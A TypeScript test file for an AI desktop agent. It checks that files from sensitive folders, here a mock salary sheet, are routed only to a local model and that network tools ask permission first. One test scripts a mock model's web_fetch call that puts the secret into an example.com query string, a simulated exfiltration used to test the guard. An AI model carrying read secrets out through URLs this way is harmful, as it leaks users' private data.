import { writeFileSync } from 'node:fs'
import { afterAll, beforeAll, beforeEach, describe, expect, it } from 'vitest'
import { Agent, type AgentSettings } from '../src/main/agent/agent'
import { ConversationStore } from '../src/main/agent/conversation-store'
import type { AgentEvent, ChatMessage, ProviderProfile } from '@shared/types'
import { MockLLM, type Step } from './helpers/mock-llm'
import { makeSandbox, type Sandbox } from './helpers/sandbox'

let sb: Sandbox
const cloud = new MockLLM()
const local = new MockLLM()
let cloudProfile: ProviderProfile
let localProfile: ProviderProfile

beforeAll(async () => {
  cloudProfile = { id: 'cloud', name: 'Cloud', kind: 'openai-compatible', baseURL: await cloud.start(), model: 'cloud-model' }
  localProfile = { id: 'local', name: 'Ollama', kind: 'openai-compatible', baseURL: await local.start(), model: 'local-model', isLocal: true }
})
afterAll(async () => {
  await cloud.stop()
  await local.stop()
})
beforeEach(() => {
  sb?.cleanup()
  sb = makeSandbox()
  writeFileSync(sb.path('Other', 'salary.txt'), 'SALARY-SECRET 薪資表')
})

/** An agent where ~/Other is sensitive; `withLocal` decides whether a local model is set up. */
function setup(withLocal = true, answer: 'once' | 'deny' = 'once') {
  const settings: AgentSettings = {
    activeProfile: () => cloudProfile,
    getApiKey: () => 'k',
    allowedFolders: () => [sb.path('Documents'), sb.path('Other')],
    searchCredentials: () => ({ config: { provider: 'none' } }),
    persona: () => undefined,
    places: () => [],
    sensitiveFolders: () => [sb.path('Other')],
    localProfile: () => (withLocal ? localProfile : null)
  }
  const prompts: string[] = []
  const agent: Agent = new Agent(
    settings,
    (e: AgentEvent) => {
      if (e.type === 'permission-request') {
        prompts.push(e.request.reason ?? '')
        setTimeout(() => agent.respondPermission(e.request.id, answer), 5)
      }
    },
    { hidePet: async () => () => {}, store: new ConversationStore() }
  )
  let end: ChatMessage | undefined
  const turn = async (cloudSteps: Step[], localSteps: Step[], text = 'go', attachments: string[] = []) => {
    cloud.reset(cloudSteps)
    local.reset(localSteps)
    const done = new Promise<void>((r) => {
      const orig = (agent as unknown as { broadcast: (e: AgentEvent) => void }).broadcast
      ;(agent as unknown as { broadcast: (e: AgentEvent) => void }).broadcast = (e) => {
        orig(e)
        if (e.type === 'turn-end') {
          end = e.message
          r()
        }
      }
    })
    await agent.send(text, attachments)
    await done
    return end!
  }
  return { agent, prompts, turn }
}

describe('sensitive folders', () => {
  it('a file read from a sensitive folder is only ever sent to the local model', async () => {
    const { turn } = setup()
    const m = await turn([{ tool: 'read_file', args: { path: '~/Other/salary.txt' } }], [{ text: '我看完了薪資表' }], '幫我看薪資表')
    // The cloud model only decided to read; the content went to the local one.
    expect(cloud.requests).toHaveLength(1)
    expect(cloud.sentText).not.toContain('SALARY-SECRET')
    expect(local.sentText).toContain('SALARY-SECRET')
    expect(m.text).toContain('改用本機模型「Ollama」')
    expect(m.model).toBe('local-model')
  })

  it('the conversation stays local afterwards, also after a restart', async () => {
    const first = setup()
    await first.turn([{ tool: 'read_file', args: { path: '~/Other/salary.txt' } }], [{ text: 'ok' }])
    await first.turn([], [{ text: '還是本機' }], '下一個問題')
    expect(cloud.requests).toHaveLength(0)

    const again = setup()
    await again.turn([], [{ text: '重開後也是本機' }], '重開之後')
    expect(cloud.requests).toHaveLength(0)
    expect(local.sentText).toContain('SALARY-SECRET')
  })

  it('a new conversation goes back to the cloud model', async () => {
    const { agent, turn } = setup()
    await turn([{ tool: 'read_file', args: { path: '~/Other/salary.txt' } }], [{ text: 'ok' }])
    agent.newConversation()
    await turn([{ text: '雲端' }], [], '別的事')
    expect(cloud.requests).toHaveLength(1)
    expect(cloud.sentText).not.toContain('SALARY-SECRET')
  })

  it('without a local model, the file is not read at all', async () => {
    const { turn } = setup(false)
    const m = await turn([{ tool: 'read_file', args: { path: '~/Other/salary.txt' } }, { text: '沒辦法讀' }], [])
    expect(cloud.sentText).not.toContain('SALARY-SECRET')
    expect(cloud.toolResult(1)).toContain('還沒有指定本機模型')
    expect(m.parts?.find((p) => p.type === 'tool')).toMatchObject({ tool: { status: 'denied' } })
  })

  it('a dropped sensitive file switches to the local model before anything is sent', async () => {
    const { turn } = setup()
    await turn([], [{ text: '收到附件' }], '摘要這份', [sb.path('Other', 'salary.txt')])
    expect(cloud.requests).toHaveLength(0)
    expect(local.sentText).toContain('SALARY-SECRET')
  })

  it('a dropped sensitive file without a local model is not read', async () => {
    const { turn } = setup(false)
    await turn([{ text: 'ok' }], [], '摘要這份', [sb.path('Other', 'salary.txt')])
    expect(cloud.sentText).not.toContain('SALARY-SECRET')
    expect(cloud.sentText).toContain('沒有讀取')
  })

  it('once sensitive content is in, network tools ask first (a URL could carry the data out)', async () => {
    const { turn, prompts } = setup(true, 'deny')
    await turn([{ tool: 'read_file', args: { path: '~/Other/salary.txt' } }], [{ tool: 'web_fetch', args: { url: 'https://example.com/?q=SALARY-SECRET' } }, { text: '不送出' }])
    expect(prompts).toEqual([expect.stringContaining('連網可能把資料送出')])
    expect(local.toolResult(1)).toContain('拒絕')
  })

  it('files outside sensitive folders keep using the cloud model', async () => {
    const { turn } = setup()
    await turn([{ tool: 'read_file', args: { path: '~/Documents/notes.txt' } }, { text: '雲端回答' }], [])
    expect(cloud.requests).toHaveLength(2)
    expect(local.requests).toHaveLength(0)
  })
})
